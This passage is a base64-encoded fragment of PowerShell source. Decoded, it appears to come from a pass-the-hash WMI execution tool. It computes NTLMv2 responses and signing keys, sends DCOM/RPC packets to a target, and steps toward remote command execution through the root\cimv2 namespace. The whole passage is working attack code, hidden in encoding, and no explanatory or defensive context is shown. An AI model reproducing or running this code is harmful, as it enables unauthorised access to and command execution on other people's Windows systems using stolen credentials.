2hhbGxlbmdlX2FuZF9zZWN1cml0eV9ibG9iX2J5dGVzKQ0KICAgICAgICAgICAgJHNlc3Npb25fYmFzZV9rZXkgPSAkSE1BQ19NRDUuQ29tcHV0ZUhhc2goJE5UTE12Ml9yZXNwb25zZSkNCg0KICAgICAgICAgICAgJGNsaWVudF9zaWduaW5nX2NvbnN0YW50ID0gMHg3MywweDY1LDB4NzMsMHg3MywweDY5LDB4NmYsMHg2ZSwweDIwLDB4NmIsMHg2NSwweDc5LDB4MjAsMHg3NCwweDZmLDB4MjAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2MywweDZjLDB4NjksMHg2NSwweDZlLDB4NzQsMHgyZCwweDc0LDB4NmYsMHgyZCwweDczLDB4NjUsMHg3MiwweDc2LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NjUsMHg3MiwweDIwLDB4NzMsMHg2OSwweDY3LDB4NmUsMHg2OSwweDZlLDB4NjcsMHgyMCwweDZiLDB4NjUsMHg3OSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDIwLDB4NmQsMHg2MSwweDY3LDB4NjksMHg2MywweDIwLDB4NjMsMHg2ZiwweDZlLDB4NzMsMHg3NCwweDYxLDB4NmUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg3NCwweDAwDQoNCiAgICAgICAgICAgICRNRDUgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Lk1ENUNyeXB0b1NlcnZpY2VQcm92aWRlcg0KICAgICAgICAgICAgJGNsaWVudF9zaWduaW5nX2tleSA9ICRNRDUuQ29tcHV0ZUhhc2goJHNlc3Npb25fYmFzZV9rZXkgKyAkY2xpZW50X3NpZ25pbmdfY29uc3RhbnQpDQogICAgICAgICAgICAkTlRMTXYyX3Jlc3BvbnNlID0gJE5UTE12Ml9yZXNwb25zZSArICRzZWN1cml0eV9ibG9iX2J5dGVzDQogICAgICAgICAgICAkTlRMTXYyX3Jlc3BvbnNlX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJE5UTE12Ml9yZXNwb25zZS5MZW5ndGgpDQogICAgICAgICAgICAkTlRMTXYyX3Jlc3BvbnNlX2xlbmd0aCA9ICROVExNdjJfcmVzcG9uc2VfbGVuZ3RoWzAsMV0NCiAgICAgICAgICAgICRXTUlfc2Vzc2lvbl9rZXlfb2Zmc2V0ID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkYXV0aF9kb21haW5fYnl0ZXMuTGVuZ3RoICsgJGF1dGhfdXNlcm5hbWVfYnl0ZXMuTGVuZ3RoICsgJGF1dGhfaG9zdG5hbWVfYnl0ZXMuTGVuZ3RoICsgJE5UTE12Ml9yZXNwb25zZS5MZW5ndGggKyA4OCkNCiAgICAgICAgICAgICRXTUlfc2Vzc2lvbl9rZXlfbGVuZ3RoID0gMHgwMCwweDAwDQogICAgICAgICAgICAkV01JX25lZ290aWF0ZV9mbGFncyA9IDB4MTUsMHg4MiwweDg4LDB4YTINCg0KICAgICAgICAgICAgJE5UTE1TU1BfcmVzcG9uc2UgPSAweDRlLDB4NTQsMHg0YywweDRkLDB4NTMsMHg1MywweDUwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAzLDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxOCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxOCwweDAwICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX0xNX29mZnNldCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTlRMTXYyX3Jlc3BvbnNlX2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTlRMTXYyX3Jlc3BvbnNlX2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF9OVExNX29mZnNldCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF9kb21haW5fbGVuZ3RoICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX2RvbWFpbl9sZW5ndGggKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfZG9tYWluX29mZnNldCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF91c2VybmFtZV9sZW5ndGggKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfdXNlcm5hbWVfbGVuZ3RoICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX3VzZXJuYW1lX29mZnNldCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF9ob3N0bmFtZV9sZW5ndGggKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfaG9zdG5hbWVfbGVuZ3RoICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX2hvc3RuYW1lX29mZnNldCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX3Nlc3Npb25fa2V5X2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX3Nlc3Npb25fa2V5X2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX3Nlc3Npb25fa2V5X29mZnNldCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX25lZ290aWF0ZV9mbGFncyArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF9kb21haW5fYnl0ZXMgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfdXNlcm5hbWVfYnl0ZXMgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfaG9zdG5hbWVfYnl0ZXMgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROVExNdjJfcmVzcG9uc2UNCg0KICAgICAgICAgICAgJEhNQUNfTUQ1LmtleSA9ICRjbGllbnRfc2lnbmluZ19rZXkNCiAgICAgICAgICAgIFtCeXRlW11dJHNlcXVlbmNlX251bWJlciA9IDB4MDAsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICRwYWNrZXRfUlBDID0gR2V0LVBhY2tldFJQQ0FVVEgzICROVExNU1NQX3Jlc3BvbnNlDQogICAgICAgICAgICAkcGFja2V0X1JQQ1siUlBDQVVUSDNfQ2FsbElEIl0gPSAweDAyLDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAkcGFja2V0X1JQQ1siUlBDQVVUSDNfQXV0aExldmVsIl0gPSAweDA0DQogICAgICAgICAgICAkUlBDID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9SUEMNCiAgICAgICAgICAgICRXTUlfY2xpZW50X3NlbmQgPSAkUlBDDQogICAgICAgICAgICAkV01JX2NsaWVudF9yYW5kb21fcG9ydF9zdHJlYW0uV3JpdGUoJFdNSV9jbGllbnRfc2VuZCwwLCRXTUlfY2xpZW50X3NlbmQuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAkV01JX2NsaWVudF9yYW5kb21fcG9ydF9zdHJlYW0uRmx1c2goKQ0KICAgICAgICAgICAgJHBhY2tldF9SUEMgPSBHZXQtUGFja2V0UlBDUmVxdWVzdCAweDgzIDc2IDE2IDQgMHgwMiwweDAwLDB4MDAsMHgwMCAweDAwLDB4MDAgMHgwMywweDAwICRvYmplY3RfVVVJRA0KICAgICAgICAgICAgJHBhY2tldF9yZW1fcXVlcnlfaW50ZXJmYWNlID0gR2V0LVBhY2tldERDT01SZW1RdWVyeUludGVyZmFjZSAkY2F1c2FsaXR5X0lEX2J5dGVzICRJUElEIDB4ZDYsMHgxYywweDc4LDB4ZDQsMHhkMywweGU1LDB4ZGYsMHg0NCwweGFkLDB4OTQsMHg5MywweDBlLDB4ZmUsMHg0OCwweGE4LDB4ODcNCiAgICAgICAgICAgICRwYWNrZXRfTlRMTVNTUF92ZXJpZmllciA9IEdldC1QYWNrZXROVExNU1NQVmVyaWZpZXIgNCAweDA0ICRzZXF1ZW5jZV9udW1iZXINCiAgICAgICAgICAgICRSUEMgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQw0KICAgICAgICAgICAgJHJlbV9xdWVyeV9pbnRlcmZhY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X3JlbV9xdWVyeV9pbnRlcmZhY2UNCiAgICAgICAgICAgICROVExNU1NQX3ZlcmlmaWVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OVExNU1NQX3ZlcmlmaWVyDQogICAgICAgICAgICAkSE1BQ19NRDUua2V5ID0gJGNsaWVudF9zaWduaW5nX2tleQ0KICAgICAgICAgICAgJFJQQ19zaWduYXR1cmUgPSAkSE1BQ19NRDUuQ29tcHV0ZUhhc2goJHNlcXVlbmNlX251bWJlciArICRSUEMgKyAkcmVtX3F1ZXJ5X2ludGVyZmFjZSArICROVExNU1NQX3ZlcmlmaWVyWzAuLjExXSkNCiAgICAgICAgICAgICRSUENfc2lnbmF0dXJlID0gJFJQQ19zaWduYXR1cmVbMC4uN10NCiAgICAgICAgICAgICRwYWNrZXRfTlRMTVNTUF92ZXJpZmllclsiTlRMTVNTUFZlcmlmaWVyX05UTE1TU1BWZXJpZmllckNoZWNrc3VtIl0gPSAkUlBDX3NpZ25hdHVyZQ0KICAgICAgICAgICAgJE5UTE1TU1BfdmVyaWZpZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05UTE1TU1BfdmVyaWZpZXINCiAgICAgICAgICAgICRXTUlfY2xpZW50X3NlbmQgPSAkUlBDICsgJHJlbV9xdWVyeV9pbnRlcmZhY2UgKyAkTlRMTVNTUF92ZXJpZmllcg0KICAgICAgICAgICAgJFdNSV9jbGllbnRfcmFuZG9tX3BvcnRfc3RyZWFtLldyaXRlKCRXTUlfY2xpZW50X3NlbmQsMCwkV01JX2NsaWVudF9zZW5kLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgJFdNSV9jbGllbnRfcmFuZG9tX3BvcnRfc3RyZWFtLkZsdXNoKCkgICAgDQogICAgICAgICAgICAkV01JX2NsaWVudF9yYW5kb21fcG9ydF9zdHJlYW0uUmVhZCgkV01JX2NsaWVudF9yZWNlaXZlLDAsJFdNSV9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICRXTUlfY2xpZW50X3N0YWdlID0gJ2V4aXQnDQoNCiAgICAgICAgICAgIGlmKCRXTUlfY2xpZW50X3JlY2VpdmVbMl0gLWVxIDMgLWFuZCBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRXTUlfY2xpZW50X3JlY2VpdmVbMjQuLjI3XSkgLWVxICcwNS0wMC0wMC0wMCcpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICIkb3V0cHV0X3VzZXJuYW1lIFdNSSBhY2Nlc3MgZGVuaWVkIG9uICR0YXJnZXRfbG9uZyIgICANCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2VpZigkV01JX2NsaWVudF9yZWNlaXZlWzJdIC1lcSAzKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRlcnJvcl9jb2RlID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkV01JX2NsaWVudF9yZWNlaXZlWzI3Li4yNF0pDQogICAgICAgICAgICAgICAgJGVycm9yX2NvZGUgPSAkZXJyb3JfY29kZSAtcmVwbGFjZSAiLSIsIiINCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIkZhaWxlZCB3aXRoIGVycm9yIGNvZGUgMHgkZXJyb3JfY29kZSINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2VpZigkV01JX2NsaWVudF9yZWNlaXZlWzJdIC1lcSAyKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRXTUlfZGF0YSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFdNSV9jbGllbnRfcmVjZWl2ZSkNCiAgICAgICAgICAgICAgICAkV01JX2RhdGEgPSAkV01JX2RhdGEgLXJlcGxhY2UgIi0iLCIiDQogICAgICAgICAgICAgICAgJE9YSURfaW5kZXggPSAkV01JX2RhdGEuSW5kZXhPZigkT1hJRCkNCiAgICAgICAgICAgICAgICAkT1hJRF9ieXRlc19pbmRleCA9ICRPWElEX2luZGV4IC8gMg0KICAgICAgICAgICAgICAgICRvYmplY3RfVVVJRDIgPSAkV01JX2NsaWVudF9yZWNlaXZlWygkT1hJRF9ieXRlc19pbmRleCArIDE2KS4uKCRPWElEX2J5dGVzX2luZGV4ICsgMzEpXQ0KICAgICAgICAgICAgICAgICRXTUlfY2xpZW50X3N0YWdlID0gJ0FsdGVyQ29udGV4dCcNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlNvbWV0aGluZyB3ZW50IHdyb25nIg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJBdHRlbXB0aW5nIGNvbW1hbmQgZXhlY3V0aW9uIg0KICAgICAgICAgICAgJHJlcXVlc3Rfc3BsaXRfaW5kZXggPSA1NTAwDQoNCiAgICAgICAgICAgIDpXTUlfZXhlY3V0ZV9sb29wIHdoaWxlICgkV01JX2NsaWVudF9zdGFnZSAtbmUgJ2V4aXQnKQ0KICAgICAgICAgICAgew0KDQogICAgICAgICAgICAgICAgaWYoJFdNSV9jbGllbnRfcmVjZWl2ZVsyXSAtZXEgMykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICRlcnJvcl9jb2RlID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkV01JX2NsaWVudF9yZWNlaXZlWzI3Li4yNF0pDQogICAgICAgICAgICAgICAgICAgICRlcnJvcl9jb2RlID0gJGVycm9yX2NvZGUgLXJlcGxhY2UgIi0iLCIiDQogICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiRmFpbGVkIHdpdGggZXJyb3IgY29kZSAweCRlcnJvcl9jb2RlIg0KICAgICAgICAgICAgICAgICAgICAkV01JX2NsaWVudF9zdGFnZSA9ICdleGl0Jw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIHN3aXRjaCAoJFdNSV9jbGllbnRfc3RhZ2UpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICdBbHRlckNvbnRleHQnDQogICAgICAgICAgICAgICAgICAgIHsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgc3dpdGNoICgkc2VxdWVuY2VfbnVtYmVyWzBdKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGFsdGVyX2NvbnRleHRfY2FsbF9JRCA9IDB4MDMsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGFsdGVyX2NvbnRleHRfY29udGV4dF9JRCA9IDB4MDIsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYWx0ZXJfY29udGV4dF9VVUlEID0gMHhkNiwweDFjLDB4NzgsMHhkNCwweGQzLDB4ZTUsMHhkZiwweDQ0LDB4YWQsMHg5NCwweDkzLDB4MGUsMHhmZSwweDQ4LDB4YTgsMHg4Nw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX2NsaWVudF9zdGFnZV9uZXh0ID0gJ1JlcXVlc3QnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGFsdGVyX2NvbnRleHRfY2FsbF9JRCA9IDB4MDQsMHgwMCwweDAwLDB4MDAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhbHRlcl9jb250ZXh0X2NvbnRleHRfSUQgPSAweDAzLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGFsdGVyX2NvbnRleHRfVVVJRCA9IDB4MTgsMHhhZCwweDA5LDB4ZjMsMHg2YSwweGQ4LDB4ZDAsMHgxMSwweGEwLDB4NzUsMHgwMCwweGMwLDB4NGYsMHhiNiwweDg4LDB4MjANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfc3RhZ2VfbmV4dCA9ICdSZXF1ZXN0Jw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDYNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhbHRlcl9jb250ZXh0X2NhbGxfSUQgPSAweDA5LDB4MDAsMHgwMCwweDAwIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYWx0ZXJfY29udGV4dF9jb250ZXh0X0lEID0gMHgwNCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhbHRlcl9jb250ZXh0X1VVSUQgPSAweDk5LDB4ZGMsMHg1NiwweDk1LDB4OGMsMHg4MiwweGNmLDB4MTEsMHhhMywweDdlLDB4MDAsMHhhYSwweDAwLDB4MzIsMHg0MCwweGM3DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRXTUlfY2xpZW50X3N0YWdlX25leHQgPSAnUmVxdWVzdCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9SUEMgPSBHZXQtUGFja2V0UlBDQWx0ZXJDb250ZXh0ICRhc3NvY19ncm91cCAkYWx0ZXJfY29udGV4dF9jYWxsX0lEICRhbHRlcl9jb250ZXh0X2NvbnRleHRfSUQgJGFsdGVyX2NvbnRleHRfVVVJRA0KICAgICAgICAgICAgICAgICAgICAgICAgJFJQQyA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDDQogICAgICAgICAgICAgICAgICAgICAgICAkV01JX2NsaWVudF9zZW5kID0gJFJQQw0KICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfcmFuZG9tX3BvcnRfc3RyZWFtLldyaXRlKCRXTUlfY2xpZW50X3NlbmQsMCwkV01JX2NsaWVudF9zZW5kLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfcmFuZG9tX3BvcnRfc3RyZWFtLkZsdXNoKCkgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAkV01JX2NsaWVudF9yYW5kb21fcG9ydF9zdHJlYW0uUmVhZCgkV01JX2NsaWVudF9yZWNlaXZlLDAsJFdNSV9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRXTUlfY2xpZW50X3N0YWdlID0gJFdNSV9jbGllbnRfc3RhZ2VfbmV4dA0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgJ1JlcXVlc3QnDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X3NwbGl0ID0gJGZhbHNlDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoJHNlcXVlbmNlX251bWJlclswXSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZXF1ZW5jZV9udW1iZXIgPSAweDAxLDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X2ZsYWdzID0gMHg4Mw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9hdXRoX3BhZGRpbmcgPSAxMg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9jYWxsX0lEID0gMHgwMywweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9jb250ZXh0X0lEID0gMHgwMiwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X29wbnVtID0gMHgwMywweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X1VVSUQgPSAkb2JqZWN0X1VVSUQyDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRob3N0bmFtZV9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRhdXRoX2hvc3RuYW1lLkxlbmd0aCArIDEpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRXTUlfY2xpZW50X3N0YWdlX25leHQgPSAnQWx0ZXJDb250ZXh0Jw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKFtCb29sXSgkYXV0aF9ob3N0bmFtZS5MZW5ndGggJSAyKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfaG9zdG5hbWVfYnl0ZXMgKz0gMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF9ob3N0bmFtZV9ieXRlcyArPSAweDAwLDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3R1Yl9kYXRhID0gMHgwNSwweDAwLDB4MDcsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAgKyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjYXVzYWxpdHlfSURfYnl0ZXMgKyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDIsMHgwMCArIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGhvc3RuYW1lX2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRob3N0bmFtZV9sZW5ndGggKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfaG9zdG5hbWVfYnl0ZXMgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHByb2Nlc3NfSURfYnl0ZXMgKyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VxdWVuY2VfbnVtYmVyID0gMHgwMiwweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9mbGFncyA9IDB4ODMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3RfYXV0aF9wYWRkaW5nID0gOA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9jYWxsX0lEID0gMHgwNCwweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9jb250ZXh0X0lEID0gMHgwMywweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X29wbnVtID0gMHgwMywweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X1VVSUQgPSAkSVBJRA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX2NsaWVudF9zdGFnZV9uZXh0ID0gJ1JlcXVlc3QnDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN0dWJfZGF0YSA9IDB4MDUsMHgwMCwweDA3LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwICsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY2F1c2FsaXR5X0lEX2J5dGVzICsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMA0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlcXVlbmNlX251bWJlciA9IDB4MDMsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3RfZmxhZ3MgPSAweDgzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X2F1dGhfcGFkZGluZyA9IDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3RfY2FsbF9JRCA9IDB4MDUsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3RfY29udGV4dF9JRCA9IDB4MDMsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9vcG51bSA9IDB4MDYsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9VVUlEID0gJElQSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kV01JX25hbWVzcGFjZV9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCR0YXJnZXRfc2hvcnQuTGVuZ3RoICsgMTQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJFdNSV9uYW1lc3BhY2VfdW5pY29kZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoIlxcJHRhcmdldF9zaG9ydFxyb290XGNpbXYyIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfc3RhZ2VfbmV4dCA9ICdSZXF1ZXN0Jw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKFtCb29sXSgkdGFyZ2V0X3Nob3J0Lkxlbmd0aCAlIDIpKQ0KICAgICAgICAgICAgICAgICAgICAgI